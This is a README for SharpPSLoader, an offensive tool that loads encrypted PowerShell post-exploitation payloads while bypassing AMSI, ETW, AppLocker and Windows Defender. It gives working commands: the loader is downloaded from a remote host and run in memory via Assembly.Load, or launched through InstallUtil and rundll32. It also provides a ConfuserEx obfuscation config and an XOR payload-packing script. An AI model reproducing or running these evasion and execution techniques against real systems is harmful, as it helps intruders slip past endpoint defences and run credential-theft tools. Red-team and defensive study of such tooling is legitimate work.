# SharpPSLoader

SharpPSLoader is a loader for [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack) and other powershell scripts, designed to bypass AMSI, Constrained Language Mode (CLM), Applocker, and Windows Defender using the [PowerPick](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) technique and LOLBAS binaries. 


SharpPSLoader works like this: 
1. Decrypt single-byte encrypted powershell payload (currently PowerSharpPack & Invoke-Bloodhound) from its resources section
2. Bypass AMSI and ETW
3. Create custom Powershell runspace and load #1 in-memory 
4. Invoke #1 powershell payload with user argument 

For detailed usage, refer to the `Usage` section below.

## Credits 
All credits goes to [@S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t), [@Jean_Maes_1994](https://twitter.com/Jean_Maes_1994), [@xpn](https://twitter.com/_xpn_), [@3xpl01tc0d3r](https://3xpl01tc0d3r.blogspot.com/), [@mariuszbit/mgeeky](https://twitter.com/mariuszbit), OSEP, and other researchers in the field. I just copy/pasted their code & added couple lines of code and that's all.

## Demo 
SharpPSLoader can be executed on-disk, in-memory, through InstallUtils.exe, and through rundll32.exe. 

![demo](/images/Sharppsloader-demo.gif)

## Usage 

SharpPSLoaderConsole and SharpPSLoaderLibrary can be executed with the following syntax: 
```
./SharpPSLoaderConsole <payload#> <powershell_function & arguments>
ex) ./SharpPSLoaderConsole 1 powersharppack -rubeus -command "triage"
```

Current list of payloads:
```
1 = PowerSharpPack 
2 = Invoke-Bloodhound 
```

### SharpPSLoaderConsole - on-disk console 
```
(new-object net.webclient).downloadfile("http://192.168.40.130:8888/SharpPSLoaderConsole.exe","c:\users\low\SharpPSLoaderConsole.exe")
.\SharpPSLoaderConsole.exe 1 powersharppack -seatbelt -command "-group=user"
```
### SharpPSLoaderConsole - in-memory 
```
$b = (New-Object net.webclient).DownloadData("http://192.168.40.130:8888/SharpPSLoaderConsole.exe")
[System.Reflection.Assembly]::Load($b)
[SharpPSLoaderConsole.SharpPSLoaderConsole]::Main(@("1","Powersharppack -sharpup audit"))

[SharpPSLoaderConsole.SharpPSLoaderConsole]::Main(@("2","Invoke-Bloodhound -c All"))
```

### SharpPSLoaderConsole - LOLBAS - InstallUtils.exe, on-disk
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="<payload#> <powershell_function & argument>" /U .\SharpPSLoaderConsole.exe

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="1 PowerSharpPack -seatbelt -Command '-group=user'" /U .\SharpPSLoaderConsole.exe
```

### SharpPSLoaderLibrary - LOLBAS - rundll32.exe, on-disk 
```
(64bit) c:\windows\system32\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user 

(32bit)) C:\Windows\SysWOW64\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user
```

## Usage - Powershell Payloads 
For detailed usage of PowerSharpPack and Invoke-Bloodhound, refer to the `References` section down below.

## Obfuscation - Warning 
If you want to obfuscate the assembly with confuserEx and execute it in-memory, use the  `SharpPSLoader-confuser.crproj` configuration file as a template. The configuration file's rules were specifically built to not scramble assembly types and not include compressor so the assembly can be executed in-memory. If you know what you are doing, you do you.  

```
<project outputDir="<output-directory>" baseDir="<base-directory>" xmlns="http://confuser.codeplex.com">
  <module path="SharpPSLoaderConsole.exe">
    <rule pattern="true" preset="normal" inherit="false">
      <protection id="resources" />
      <protection id="rename" action="remove" />
      <protection id="typescramble" action="remove" />
      <protection id="constants" />
      <protection id="ctrl flow" />
    </rule>
  </module>
</project>
```

## Adding Powershell Payloads 
Currently, the powershell payloads are encrypted with single-byte XOR bytes with a hardcode key of "111".

The following powershell script can be used to create a xor encrypted powershell payload.
```
function Invoke-SingleByteXOR{
	param($filepath, $key)

    $xorKey = [System.Convert]::ToByte($key)
	$byteString = [System.IO.File]::ReadAllBytes($filepath)

    $xorData = $(for($i=0; $i -lt $byteString.length; $i++){
        $byteString[$i] = $byteString[$i] -bxor $xorKey
    })

    Set-Content $($filepath+".xor") -Value $byteString -Encoding Byte
}

ps> Invoke-SingleByteXOR c:\dev\powerview.ps1 111 
```

Add the xor'ed payload through `Project right click > Properties > Resources > drag/drop the payload`. 

Then, edit the switch statement in `DecryptedPSFromRsrcDict` function.  

## References & Credits 
- [PowerSharpPack](https://github.com/S3cur3Th1sSh1t/PowerSharpPack)
- [Bloodhound](https://github.com/BloodHoundAD/BloodHound)
- https://www.netspi.com/blog/technical/adversary-simulation/evolution-of-offensive-powershell-invocation/
- https://github.com/mgeeky/Stracciatella
- https://blog.xpnsec.com/rundll32-your-dotnet/
- https://3xpl01tc0d3r.blogspot.com/2019/11/managed-dll-exports-and-run-via-rundll32.html